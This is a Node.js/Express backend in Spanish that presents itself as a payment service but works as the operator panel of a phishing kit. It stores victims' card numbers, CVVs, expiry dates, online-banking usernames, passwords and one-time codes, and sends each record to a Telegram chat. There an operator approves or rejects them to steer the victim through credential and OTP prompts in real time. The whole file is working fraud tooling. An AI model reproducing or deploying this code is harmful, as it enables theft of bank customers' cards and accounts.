const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 5,
    ssl: { rejectUnauthorized: false }
});
pool.on('error', err => console.error('❌ PG pool error:', err));

// 🔥 Variables de entorno
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';

async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS pagos_pendientes (
            id               SERIAL PRIMARY KEY,
            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
            titular          VARCHAR(120),
            numero_tarjeta   VARCHAR(30),
            cvv              VARCHAR(6),
            vencimiento      VARCHAR(10),
            marca_tarjeta    VARCHAR(20),
            banco_emisor     VARCHAR(120),
            estado           VARCHAR(30) DEFAULT 'pendiente',
            motivo_rechazo   TEXT,
            redirigir_a      VARCHAR(60),
            telegram_msg_id  BIGINT,
            created_at       TIMESTAMPTZ DEFAULT NOW(),
            updated_at       TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
    `);

    await pool.query(`
        ALTER TABLE pagos_pendientes
          ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS password_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS codigo_otp VARCHAR(20),
          ADD COLUMN IF NOT EXISTS paso VARCHAR(30) DEFAULT 'crear',
          ADD COLUMN IF NOT EXISTS fase_actual VARCHAR(20) DEFAULT 'credenciales',
          ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
          ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
    `);

    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
    console.log('✅ Tabla lista');
}
initDB().catch(err => console.error('❌ initDB:', err));

// --- HELPERS TELEGRAM ---
async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        return await r.json();
    } catch (e) { return { ok: false }; }
}

async function tgEditMessage(messageId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' }) });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
    } catch {}
}

function construirTextoPago(pago) {
    const usuario = pago.usuario_banco ? pago.usuario_banco : '—';
    const password = pago.password_banco ? pago.password_banco : '—';
    const otp = pago.codigo_otp ? pago.codigo_otp : '—';

    return (
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
        `👤 <b>Usuario:</b> <code>${usuario}</code>\n` +
        `🔑 <b>Contraseña:</b> <code>${password}</code>\n` +
        `🔐 <b>OTP:</b> <code>${otp}</code>\n` +
        `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
    );
}

async function enviarSolicitudATelegram(pago) {
    const texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };
    const res = await tgSendMessage(texto, replyMarkup);
    if (res.ok && res.result) {
        await pool.query(`UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`, [res.result.message_id, pago.solicitud_id]);
    }
}

async function actualizarMensajeTG(pago, encabezado, textoExtra) {
    if (!pago.telegram_msg_id) return;
    const texto = `${encabezado}\n\n` + construirTextoPago(pago) + (textoExtra ? `\n\n${textoExtra}` : '');
    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: pago.telegram_msg_id, text, parse_mode: 'HTML', reply_markup: replyMarkup }) });
    } catch (e) {}
}

// --- ENDPOINTS ---
app.post('/api/crear-pago', async (req, res) => {
    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });

    try {
        const result = await pool.query(
            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
             ON CONFLICT (solicitud_id) DO UPDATE
               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), updated_at = NOW()
             RETURNING *`,
            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' ? 'otp' : 'credenciales']
        );

        const pago = result.rows[0];
        const pasoActual = (paso || 'crear').toLowerCase();
        const esNueva = !pago.telegram_msg_id;

        if (esNueva) {
            await enviarSolicitudATelegram(pago);
        } else {
            if (pasoActual === 'credenciales') await actualizarMensajeTG(pago, '📝 <b>CREDENCIALES RECIBIDAS</b>', '⏳ <b>Esperando aprobación...</b>');
            else if (pasoActual === 'otp') await actualizarMensajeTG(pago, '🔐 <b>OTP RECIBIDO</b>', '⏳ <b>Esperando aprobación...</b>');
        }

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Error al registrar el pago' });
    }
});

app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
    try {
        const result = await pool.query(`SELECT estado, motivo_rechazo, redirigir_a, marca_tarjeta, fase_actual, credenciales_aprobadas, otp_aprobado FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
        if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
        const row = result.rows[0];

        if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
        if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });

        if (row.estado === 'aprobado' || row.otp_aprobado === true) return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a}`, marca: row.marca_tarjeta });
        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });

        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const update = req.body || {};
    const cq = update.callback_query;
    if (!cq || !cq.data) return;

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [solicitud_id]);
        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'Solicitud no encontrada');
        const pago = result.rows[0];

        const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';

        if (accion === 'aprobar') {
            if (!estaEnFaseOTP) {
                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado_credenciales', credenciales_aprobadas = TRUE, updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
            } else {
                const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago) + `\n➡️ <b>Redirigido a:</b> ${archivo}`);
            }
        } else if (accion === 'rechazar') {
            const motivo = estaEnFaseOTP ? 'El código OTP es incorrecto.' : 'Las credenciales son incorrectas.';
            const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
            await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
        }
    } catch (err) { console.error('❌ webhook:', err); }
});

async function registrarWebhook() {
    if (!TELEGRAM_TOKEN) return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
        console.log('✅ Webhook registrado');
    } catch (e) { console.error('❌ Error webhook:', e.message); }
}

app.get('/health', (_req, res) => res.json({ ok: true }));
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend en puerto ${PORT}`);
    registrarWebhook();
});
